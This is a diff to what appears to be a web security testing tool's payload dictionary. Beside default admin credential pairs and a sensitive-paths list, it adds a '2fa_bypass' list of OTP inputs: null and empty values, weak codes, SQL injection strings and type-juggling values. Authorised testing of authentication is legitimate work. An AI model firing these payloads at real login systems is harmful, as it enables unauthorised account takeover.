@@ -182,6 +182,38 @@ PAYLOADS: dict[str, list[str | tuple[str, str]]] = {
         ("admin", "Admin123"),
         ("Admin", "Admin"),
     ],
+    "2fa_bypass": [
+        # Empty/null OTP
+        "",
+        " ",
+        "null",
+        "undefined",
+        "0",
+        "000000",
+        # Common weak OTPs
+        "123456",
+        "111111",
+        "000000",
+        "999999",
+        "1234",
+        "0000",
+        # Response manipulation (for tools that modify responses)
+        "true",
+        "false",
+        # SQL injection in OTP field
+        "' OR '1'='1",
+        "' OR 1=1--",
+        "1' OR '1'='1",
+        # Array bypass
+        "[]",
+        "['']",
+        # Negative/special numbers
+        "-1",
+        "99999999",
+        # Type juggling
+        "0e123",
+        "0.0",
+    ],
     "sensitive_paths": [
         "/robots.txt",
         "/.git/config",
